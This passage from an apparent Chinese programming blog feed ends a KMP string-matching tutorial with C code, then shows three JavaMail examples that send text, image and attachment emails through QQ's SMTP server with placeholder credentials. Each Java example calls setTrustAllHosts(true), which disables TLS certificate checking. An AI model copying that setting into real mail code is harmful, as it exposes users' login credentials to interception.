<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//s是主串，len1是主传的长度，p是模式串，len2是模式串的长度，next是求得的next[]数组 </span></span><br><span class="line"><span class="comment">//查询到了，就返回模式串在主串中的位置</span></span><br><span class="line"><span class="comment">//如果没有查询到，就返回-1</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">kmp</span><span class="params">(<span class="keyword">char</span> s[], <span class="keyword">int</span> len1, <span class="keyword">char</span> p[], <span class="keyword">int</span> len2, <span class="keyword">int</span> next[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ret = <span class="number">-1</span>;</span><br><span class="line">    <span class="comment">//这里i也可以为1，j也可以为1，这样就可以直接从下标为1的位置开始查询了</span></span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (i &lt;= len1)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//这里的j==0为真的时候，表示需要将模式串的第一个字符和主串的下一个字符进行匹配，所以需要进去执行i++, j++;</span></span><br><span class="line">        <span class="keyword">if</span> (j == <span class="number">0</span> || s[i] == p[j])</span><br><span class="line">        &#123;</span><br><span class="line">            i++, j++;</span><br><span class="line">            <span class="keyword">if</span> (j == len2)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">//返回的是模式串在主串中的第一个字符出现的位置 </span></span><br><span class="line">                <span class="keyword">return</span> i + <span class="number">1</span> - len2;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            j = next[j];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>同样的方法，代码看不懂没关系，小的这就为您来讲解蛤(～￣▽￣)～ </p>
<p><img src="https://i.loli.net/2021/11/30/hWBVom3ANpin2H4.jpg" alt="src=http___bpic.588ku.com_element_pic_17_10_06_fc8c4574f01bbf61cd3fb28bdb4ea40b.jpg&amp;refer=http___bpic.588ku"></p>
<p>理解了上面的next数组的计算方法后，这个KMP匹配的过程就变得简单了。</p>
<p>案例：</p>
<p><img src="https://i.loli.net/2021/12/01/2Q85oYeZOkIqSnG.png" alt="image-20211201000020699"></p>
<p>这里可以换一种理解方式，按照<strong>“条件 → 结果”</strong>的方式理解：</p>
<p>在匹配的过程中，会出现三种情况（<strong>条件</strong>）：</p>
<ol>
<li>j回退到了0（回退是第3种情况的发生所导致的，看下面结果所采取的的措施就明白了）</li>
<li>s[i] == p[j]（即主串和模式串对应的字符相等）</li>
<li>上述1和2两种情况都没有发生（即主串和模式串对应的字符不相等，且j不是0）</li>
</ol>
<p><strong>结果：</strong></p>
<ul>
<li>1和2都是需要将主串下一个字符与模式串 j+1 位置的字符进行比较的。</li>
<li>而第3种，就需要借助next[]数组，将 j 进行回退了，以便下次匹配的时候能够达到：既不需要回溯，又不会错过能够进行匹配的情况（不断提高了效率，还保证了正确性）</li>
</ul>
<h2 id="提供一个检测的算法正确性的例子"><a href="#提供一个检测的算法正确性的例子" class="headerlink" title="提供一个检测的算法正确性的例子"></a>提供一个检测的算法正确性的例子</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//ch数组是模式串，length是模式串的长度，next数组就是我们所要求的next[]数组</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getnext</span><span class="params">(<span class="keyword">char</span> ch[],<span class="keyword">int</span> length, <span class="keyword">int</span> next[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    next[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">1</span>, j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(i &lt; length) &#123;</span><br><span class="line">        <span class="keyword">if</span>(j == <span class="number">0</span> || ch[i] == ch[j])</span><br><span class="line">            next[++i] = ++j;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            j = next[j];	<span class="comment">//j回退</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//s是主串，len1是主传的长度，p是模式串，len2是模式串的长度，next是求得的next[]数组 </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">kmp</span><span class="params">(<span class="keyword">char</span> s[], <span class="keyword">int</span> len1, <span class="keyword">char</span> p[], <span class="keyword">int</span> len2, <span class="keyword">int</span> next[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ret = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (i &lt;= len1)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (j == <span class="number">0</span> || s[i] == p[j])</span><br><span class="line">        &#123;</span><br><span class="line">            i++, j++;</span><br><span class="line">            <span class="keyword">if</span> (j == len2)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">//返回的是模式串在主串中的第一个字符出现的位置 </span></span><br><span class="line">                <span class="keyword">return</span> i + <span class="number">1</span> - len2;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            j = next[j];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">//模式串 </span></span><br><span class="line">    <span class="keyword">char</span> a[] = &#123;<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;A&#x27;</span>,<span class="string">&#x27;B&#x27;</span>,<span class="string">&#x27;C&#x27;</span>,<span class="string">&#x27;D&#x27;</span>,<span class="string">&#x27;A&#x27;</span>,<span class="string">&#x27;B&#x27;</span>,<span class="string">&#x27;D&#x27;</span>&#125;;</span><br><span class="line">    <span class="comment">//主串 </span></span><br><span class="line">    <span class="keyword">char</span> b[] = &#123;<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;J&#x27;</span>,<span class="string">&#x27;K&#x27;</span>,<span class="string">&#x27;A&#x27;</span>,<span class="string">&#x27;B&#x27;</span>,<span class="string">&#x27;C&#x27;</span>,<span class="string">&#x27;D&#x27;</span>,<span class="string">&#x27;A&#x27;</span>,<span class="string">&#x27;B&#x27;</span>,<span class="string">&#x27;D&#x27;</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> length = <span class="number">7</span>;</span><br><span class="line">    <span class="keyword">int</span> next[<span class="number">8</span>];</span><br><span class="line">    <span class="comment">//计算出next[]数组 </span></span><br><span class="line">    getnext(a,length,next);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;next数组对应的值（不包括下标为0的位置）：&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">7</span>; i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\t&quot;</span>,next[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n\n返回查询结果&quot;</span>);</span><br><span class="line">    <span class="keyword">int</span> result = kmp(b,<span class="number">9</span>,a,<span class="number">7</span>,next);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,result);	</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>到这里就真的结束啦</p>
<p><img src="https://i.loli.net/2021/12/01/1IHcmwPl4ynU7jz.gif" alt="src=http___www.xinyi.com_UploadFile_common_wechat_2020_12-23_4578bef0-4c0f-4e8d-b69c-044a758b700a.png&amp;refer=http___www.xinyi"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>总的来说，KMP算法的核心，给我的感觉就是一个next[]数组，它能够让主串和模式串匹配时，在不回溯的情况下，还能保证不会漏掉一些可以进行匹配的情况。</p>
<p>需要重点学习的还是next[]数组的构造过程，next[]数组会构造以后，就可以自己借助next[]数组来完成KMP匹配算法的实现过程啦！</p>
]]></content>
      <tags>
        <tag>字符串匹配</tag>
        <tag>算法</tag>
        <tag>KMP</tag>
      </tags>
  </entry>
  <entry>
    <title>Java实现邮件推送+实战</title>
    <url>/2021/10/19/Java%E5%AE%9E%E7%8E%B0%E9%82%AE%E4%BB%B6%E6%8E%A8%E9%80%81-%E5%AE%9E%E6%88%98/</url>
    <content><![CDATA[<h2 id="jar包的支持"><a href="#jar包的支持" class="headerlink" title="jar包的支持"></a>jar包的支持</h2><span id="more"></span>

<p><strong>核心功能jar包</strong></p>
<p><strong>activation-1.1.1.jar</strong></p>
<p><strong>mail-1.4.7.jar</strong></p>
<p><img src="https://i.loli.net/2021/10/19/AwFy9BfaUYVmLZs.png" alt="image-20211019231658961"></p>
<h2 id="邮件发送原理图"><a href="#邮件发送原理图" class="headerlink" title="邮件发送原理图"></a>邮件发送原理图</h2><p><img src="https://i.loli.net/2021/10/19/CApQoXxJ2Hzeb71.png" alt="邮件发送原理图"></p>
<h2 id="授权码的获取"><a href="#授权码的获取" class="headerlink" title="授权码的获取"></a>授权码的获取</h2><p><img src="https://i.loli.net/2021/10/19/Om9LTPkjKNd5R8S.png" alt="image-20211019231823437"></p>
<h2 id="简易文本邮件发送的实现（只有文本、一般是超文本类型）"><a href="#简易文本邮件发送的实现（只有文本、一般是超文本类型）" class="headerlink" title="简易文本邮件发送的实现（只有文本、一般是超文本类型）"></a>简易文本邮件发送的实现（只有文本、一般是超文本类型）</h2><p><img src="https://i.loli.net/2021/10/19/1Sq5fBUYTQ6g3dH.png" alt="简易文本邮件发送的实现"></p>
<p><strong>由上图我们可以确定几个必须步骤</strong></p>
<p><strong>1.创建session对象</strong></p>
<p><strong>2.创建Transport对象</strong></p>
<p><strong>3.使用邮箱的用户名和授权码连上邮件服务器</strong></p>
<p><strong>4.创建一个Message对象（需要传递session）</strong></p>
<ul>
<li><strong>message需要指明发件人、收件人以及文件内容</strong></li>
</ul>
<p><strong>5.发送邮件</strong></p>
<p><strong>6.关闭连接</strong></p>
<h3 id="仅包含文本的发送"><a href="#仅包含文本的发送" class="headerlink" title="仅包含文本的发送"></a>仅包含文本的发送</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.mail.util.MailSSLSocketFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.mail.*;</span><br><span class="line"><span class="keyword">import</span> javax.mail.internet.InternetAddress;</span><br><span class="line"><span class="keyword">import</span> javax.mail.internet.MimeMessage;</span><br><span class="line"><span class="keyword">import</span> java.util.Properties;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MailDemo01</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Properties prop=<span class="keyword">new</span> Properties();</span><br><span class="line">        prop.setProperty(<span class="string">&quot;mail.host&quot;</span>,<span class="string">&quot;smtp.qq.com&quot;</span>);<span class="comment">///设置QQ邮件服务器</span></span><br><span class="line">        prop.setProperty(<span class="string">&quot;mail.transport.protocol&quot;</span>,<span class="string">&quot;smtp&quot;</span>);<span class="comment">///邮件发送协议</span></span><br><span class="line">        prop.setProperty(<span class="string">&quot;mail.smtp.auth&quot;</span>,<span class="string">&quot;true&quot;</span>);<span class="comment">//需要验证用户密码</span></span><br><span class="line">        <span class="comment">//QQ邮箱需要设置SSL加密</span></span><br><span class="line">        MailSSLSocketFactory sf=<span class="keyword">new</span> MailSSLSocketFactory();</span><br><span class="line">        sf.setTrustAllHosts(<span class="keyword">true</span>);</span><br><span class="line">        prop.put(<span class="string">&quot;mail.smtp.ssl.enable&quot;</span>,<span class="string">&quot;true&quot;</span>);</span><br><span class="line">        prop.put(<span class="string">&quot;mail.smtp.ssl.socketFactory&quot;</span>,sf);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//使用javaMail发送邮件的5个步骤</span></span><br><span class="line">        <span class="comment">//1.创建定义整个应用程序所需要的环境信息的session对象</span></span><br><span class="line">        Session session=Session.getDefaultInstance(prop, <span class="keyword">new</span> Authenticator() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">protected</span> PasswordAuthentication <span class="title">getPasswordAuthentication</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> PasswordAuthentication(<span class="string">&quot;XXXX@qq.com&quot;</span>,<span class="string">&quot;授权码&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="comment">//开启session的debug模式，这样可以查看到程序发送Email的运行状态</span></span><br><span class="line">        session.setDebug(<span class="keyword">true</span>);</span><br><span class="line">        <span class="comment">//2.通过session得到transport对象</span></span><br><span class="line">        Transport ts=session.getTransport();</span><br><span class="line">        <span class="comment">//3.使用邮箱的用户名和授权码连上邮件服务器</span></span><br><span class="line">        ts.connect(<span class="string">&quot;smtp.qq.com&quot;</span>,<span class="string">&quot;XXXX@qq.com&quot;</span>,<span class="string">&quot;授权码&quot;</span>);</span><br><span class="line">        <span class="comment">//4.创建邮件：写文件</span></span><br><span class="line">        <span class="comment">//注意需要传递session</span></span><br><span class="line">        MimeMessage message=<span class="keyword">new</span> MimeMessage(session);</span><br><span class="line">        <span class="comment">//指明邮件的发件人</span></span><br><span class="line">        message.setFrom(<span class="keyword">new</span> InternetAddress(<span class="string">&quot;XXXX@qq.com&quot;</span>));</span><br><span class="line">        <span class="comment">//指明邮件的收件人</span></span><br><span class="line">        message.setRecipient(Message.RecipientType.TO,<span class="keyword">new</span> InternetAddress(<span class="string">&quot;XXXX@qq.com&quot;</span>));</span><br><span class="line">        <span class="comment">//邮件标题</span></span><br><span class="line">        message.setSubject(<span class="string">&quot;发送的标题&quot;</span>);</span><br><span class="line">        <span class="comment">//邮件的文本内容</span></span><br><span class="line">        message.setContent(<span class="string">&quot;内容&quot;</span>,<span class="string">&quot;text/html;charset=UTF-8&quot;</span>);</span><br><span class="line">        <span class="comment">//5.发送邮件</span></span><br><span class="line">        ts.sendMessage(message,message.getAllRecipients());</span><br><span class="line"></span><br><span class="line">        <span class="comment">//6.关闭连接</span></span><br><span class="line">        ts.close();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="必要配置信息："><a href="#必要配置信息：" class="headerlink" title="必要配置信息："></a>必要配置信息：</h3><p><img src="https://i.loli.net/2021/10/19/DIrkmMuqwTV72jJ.png" alt="image-20211019233456201"></p>
<h3 id="注意：QQ等大厂的邮箱需要有几点注意："><a href="#注意：QQ等大厂的邮箱需要有几点注意：" class="headerlink" title="注意：QQ等大厂的邮箱需要有几点注意："></a><strong>注意：QQ等大厂的邮箱需要有几点注意：</strong></h3><p><img src="https://i.loli.net/2021/10/19/4W9GitOfwPIlkmu.png" alt="image-20211019232913596"></p>
<h2 id="复杂文件内容的发送（含有图片、附件等）"><a href="#复杂文件内容的发送（含有图片、附件等）" class="headerlink" title="复杂文件内容的发送（含有图片、附件等）"></a>复杂文件内容的发送（含有图片、附件等）</h2><h3 id="文件构成解析"><a href="#文件构成解析" class="headerlink" title="文件构成解析"></a>文件构成解析</h3><p><img src="https://i.loli.net/2021/10/19/AFfkxdaLigJybB7.png" alt="文件构成解析"></p>
<p>除了邮件内容部分，其他的部分代码往往是相同的，除了需要根据不同的邮箱运营商编写不同的配置代码外。邮件内容也被分为很多个部分，由文件、图片、附件等构成，编写邮件内容的过程，类似于积木的拼接，另外值得注意的是文本内容一般为HTML的格式发送。</p>
<p><strong><u>每一个文本、图片、附件可以分为一个MimeBodyPart，由MimeMultipart完成组装</u></strong></p>
<h3 id="包含图片的发送"><a href="#包含图片的发送" class="headerlink" title="包含图片的发送"></a>包含图片的发送</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.mail.util.MailSSLSocketFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.activation.DataHandler;</span><br><span class="line"><span class="keyword">import</span> javax.activation.FileDataSource;</span><br><span class="line"><span class="keyword">import</span> javax.mail.*;</span><br><span class="line"><span class="keyword">import</span> javax.mail.internet.InternetAddress;</span><br><span class="line"><span class="keyword">import</span> javax.mail.internet.MimeBodyPart;</span><br><span class="line"><span class="keyword">import</span> javax.mail.internet.MimeMessage;</span><br><span class="line"><span class="keyword">import</span> javax.mail.internet.MimeMultipart;</span><br><span class="line"><span class="keyword">import</span> java.util.Properties;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MailDemo02</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Properties prop=<span class="keyword">new</span> Properties();</span><br><span class="line">        prop.setProperty(<span class="string">&quot;mail.host&quot;</span>,<span class="string">&quot;smtp.qq.com&quot;</span>);<span class="comment">///设置QQ邮件服务器</span></span><br><span class="line">        prop.setProperty(<span class="string">&quot;mail.transport.protocol&quot;</span>,<span class="string">&quot;smtp&quot;</span>);<span class="comment">///邮件发送协议</span></span><br><span class="line">        prop.setProperty(<span class="string">&quot;mail.smtp.auth&quot;</span>,<span class="string">&quot;true&quot;</span>);<span class="comment">//需要验证用户密码</span></span><br><span class="line">        <span class="comment">//QQ邮箱需要设置SSL加密</span></span><br><span class="line">        MailSSLSocketFactory sf=<span class="keyword">new</span> MailSSLSocketFactory();</span><br><span class="line">        sf.setTrustAllHosts(<span class="keyword">true</span>);</span><br><span class="line">        prop.put(<span class="string">&quot;mail.smtp.ssl.enable&quot;</span>,<span class="string">&quot;true&quot;</span>);</span><br><span class="line">        prop.put(<span class="string">&quot;mail.smtp.ssl.socketFactory&quot;</span>,sf);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//使用javaMail发送邮件的5个步骤</span></span><br><span class="line">        <span class="comment">//1.创建定义整个应用程序所需要的环境信息的session对象</span></span><br><span class="line">        Session session=Session.getDefaultInstance(prop, <span class="keyword">new</span> Authenticator() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">protected</span> PasswordAuthentication <span class="title">getPasswordAuthentication</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> PasswordAuthentication(<span class="string">&quot;11927XXX@qq.com&quot;</span>,<span class="string">&quot;授权码&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="comment">//开启session的debug模式，这样可以查看到程序发送Email的运行状态</span></span><br><span class="line">        session.setDebug(<span class="keyword">true</span>);</span><br><span class="line">        <span class="comment">//2.通过session得到transport对象</span></span><br><span class="line">        Transport ts=session.getTransport();</span><br><span class="line">        <span class="comment">//3.使用邮箱的用户名和授权码连上邮件服务器</span></span><br><span class="line">        ts.connect(<span class="string">&quot;smtp.qq.com&quot;</span>,<span class="string">&quot;11927XXX@qq.com&quot;</span>,<span class="string">&quot;授权码&quot;</span>);</span><br><span class="line">        <span class="comment">//4.创建邮件：写文件</span></span><br><span class="line">        <span class="comment">//注意需要传递session</span></span><br><span class="line">        MimeMessage message=<span class="keyword">new</span> MimeMessage(session);</span><br><span class="line">        <span class="comment">//指明邮件的发件人</span></span><br><span class="line">        message.setFrom(<span class="keyword">new</span> InternetAddress(<span class="string">&quot;11927XXX@qq.com&quot;</span>));</span><br><span class="line">        <span class="comment">//指明邮件的收件人</span></span><br><span class="line">        message.setRecipient(Message.RecipientType.TO,<span class="keyword">new</span> InternetAddress(<span class="string">&quot;11927XXX@qq.com&quot;</span>));</span><br><span class="line">        <span class="comment">//邮件标题</span></span><br><span class="line">        message.setSubject(<span class="string">&quot;java发出&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//邮件的文本内容</span></span><br><span class="line">        <span class="comment">//=================================准备图片数据=======================================</span></span><br><span class="line">        MimeBodyPart image=<span class="keyword">new</span> MimeBodyPart();</span><br><span class="line">        <span class="comment">//图片需要经过数据化的处理</span></span><br><span class="line">        DataHandler dh=<span class="keyword">new</span> DataHandler(<span class="keyword">new</span> FileDataSource(<span class="string">&quot;D:\\Bert\\1594126632(1).jpg&quot;</span>));</span><br><span class="line">        <span class="comment">//在part中放入这个处理过图片的数据</span></span><br><span class="line">        image.setDataHandler(dh);</span><br><span class="line">        <span class="comment">//给这个part设置一个ID名字</span></span><br><span class="line">        image.setContentID(<span class="string">&quot;bz.jpg&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//准备正文的数据</span></span><br><span class="line">        MimeBodyPart text=<span class="keyword">new</span> MimeBodyPart();</span><br><span class="line">        text.setContent(<span class="string">&quot;这是一张正文&lt;img src=&#x27;cid:bz.jpg&#x27;&gt;&quot;</span>,<span class="string">&quot;text/html;charset=UTF-8&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//描述数据关系</span></span><br><span class="line">        MimeMultipart mm=<span class="keyword">new</span> MimeMultipart();</span><br><span class="line">        mm.addBodyPart(text);</span><br><span class="line">        mm.addBodyPart(image);</span><br><span class="line">        mm.setSubType(<span class="string">&quot;related&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//设置到消息中，保存修改</span></span><br><span class="line">        message.setContent(mm);</span><br><span class="line">        message.saveChanges();</span><br><span class="line">        <span class="comment">//5.发送邮件</span></span><br><span class="line">        ts.sendMessage(message,message.getAllRecipients());</span><br><span class="line"></span><br><span class="line">        <span class="comment">//6.关闭连接</span></span><br><span class="line">        ts.close();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="包含附件的发送"><a href="#包含附件的发送" class="headerlink" title="包含附件的发送"></a>包含附件的发送</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.mail.util.MailSSLSocketFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.activation.DataHandler;</span><br><span class="line"><span class="keyword">import</span> javax.activation.FileDataSource;</span><br><span class="line"><span class="keyword">import</span> javax.mail.*;</span><br><span class="line"><span class="keyword">import</span> javax.mail.internet.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Properties;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MailDemo03</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Properties prop=<span class="keyword">new</span> Properties();</span><br><span class="line">        prop.setProperty(<span class="string">&quot;mail.host&quot;</span>,<span class="string">&quot;smtp.qq.com&quot;</span>);<span class="comment">///设置QQ邮件服务器</span></span><br><span class="line">        prop.setProperty(<span class="string">&quot;mail.transport.protocol&quot;</span>,<span class="string">&quot;smtp&quot;</span>);<span class="comment">///邮件发送协议</span></span><br><span class="line">        prop.setProperty(<span class="string">&quot;mail.smtp.auth&quot;</span>,<span class="string">&quot;true&quot;</span>);<span class="comment">//需要验证用户密码</span></span><br><span class="line">        <span class="comment">//QQ邮箱需要设置SSL加密</span></span><br><span class="line">        MailSSLSocketFactory sf=<span class="keyword">new</span> MailSSLSocketFactory();</span><br><span class="line">        sf.setTrustAllHosts(<span class="keyword">true</span>);</span><br><span class="line">        prop.put(<span class="string">&quot;mail.smtp.ssl.enable&quot;</span>,<span class="string">&quot;true&quot;</span>);</span><br><span class="line">        prop.put(<span class="string">&quot;mail.smtp.ssl.socketFactory&quot;</span>,sf);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//使用javaMail发送邮件的5个步骤</span></span><br><span class="line">        <span class="comment">//1.创建定义整个应用程序所需要的环境信息的session对象</span></span><br><span class="line">        Session session=Session.getDefaultInstance(prop, <span class="keyword">new</span> Authenticator() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">protected</span> PasswordAuthentication <span class="title">getPasswordAuthentication</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> PasswordAuthentication(<span class="string">&quot;1192XXXX@qq.com&quot;</span>,<span class="string">&quot;授权码&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="comment">//开启session的debug模式，这样可以查看到程序发送Email的运行状态</span></span><br><span class="line">        session.setDebug(<span class="keyword">true</span>);</span><br><span class="line">        <span class="comment">//2.通过session得到transport对象</span></span><br><span class="line">        Transport ts=session.getTransport();</span><br><span class="line">        <span class="comment">//3.使用邮箱的用户名和授权码连上邮件服务器</span></span><br><span class="line">        ts.connect(<span class="string">&quot;smtp.qq.com&quot;</span>,<span class="string">&quot;1192XXXX@qq.com&quot;</span>,<span class="string">&quot;授权码&quot;</span>);</span><br><span class="line">        <span class="comment">//4.创建邮件：写文件</span></span><br><span class="line">        <span class="comment">//注意需要传递session</span></span><br><span class="line">        MimeMessage message=<span class="keyword">new</span> MimeMessage(session);</span><br><span class="line">        <span class="comment">//指明邮件的发件人</span></span><br><span class="line">        message.setFrom(<span class="keyword">new</span> InternetAddress(<span class="string">&quot;1192XXXX@qq.com&quot;</span>));</span><br><span class="line">        <span class="comment">//指明邮件的收件人</span></span><br><span class="line">        message.setRecipient(Message.RecipientType.TO,<span class="keyword">new</span> InternetAddress(<span class="string">&quot;1192XXXX@qq.com&quot;</span>));</span><br><span class="line">        <span class="comment">//邮件标题</span></span><br><span class="line">        message.setSubject(<span class="string">&quot;java发出&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//邮件的文本内容</span></span><br><span class="line">        <span class="comment">//=================================准备图片数据</span></span><br><span class="line">        MimeBodyPart image=<span class="keyword">new</span> MimeBodyPart();</span><br><span class="line">        <span class="comment">//图片需要经过数据化的处理</span></span><br><span class="line">        DataHandler dh=<span class="keyword">new</span> DataHandler(<span class="keyword">new</span> FileDataSource(<span class="string">&quot;D:\\Bert\\1594126632(1).jpg&quot;</span>));</span><br><span class="line">        <span class="comment">//在part中放入这个处理过图片的数据</span></span><br><span class="line">        image.setDataHandler(dh);</span><br><span class="line">        <span class="comment">//给这个part设置一个ID名字</span></span><br><span class="line">        image.setContentID(<span class="string">&quot;bz.jpg&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//=================================准备正文数据</span></span><br><span class="line">        MimeBodyPart text=<span class="keyword">new</span> MimeBodyPart();</span><br><span class="line">        text.setContent(<span class="string">&quot;这是一张正文&lt;img src=&#x27;cid:bz.jpg&#x27;&gt;&quot;</span>,<span class="string">&quot;text/html;charset=UTF-8&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//=================================准备附件数据</span></span><br><span class="line">        MimeBodyPart body1= <span class="keyword">new</span> MimeBodyPart();</span><br><span class="line">        body1.setDataHandler(<span class="keyword">new</span> DataHandler(<span class="keyword">new</span> FileDataSource(<span class="string">&quot;D:\\Bert\\cmd.txt&quot;</span>)));</span><br><span class="line">        body1.setFileName(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//描述数据关系</span></span><br><span class="line">        MimeMultipart mm=<span class="keyword">new</span> MimeMultipart();</span><br><span class="line">        mm.addBodyPart(body1);</span><br><span class="line">        mm.addBodyPart(text);</span><br><span class="line">        mm.addBodyPart(image);</span><br><span class="line">        mm.setSubType(<span class="string">&quot;mixed&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//设置到消息中，保存修改</span></span><br><span class="line">        message.setContent(mm);</span><br><span class="line">        message.saveChanges();</span><br><span class="line">        <span class="comment">//5.发送邮件</span></span><br><span class="line">        ts.sendMessage(message,message.getAllRecipients());</span><br><span class="line"></span><br><span class="line">        <span class="comment">//6.关闭连接</span></span><br><span class="line">        ts.close();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

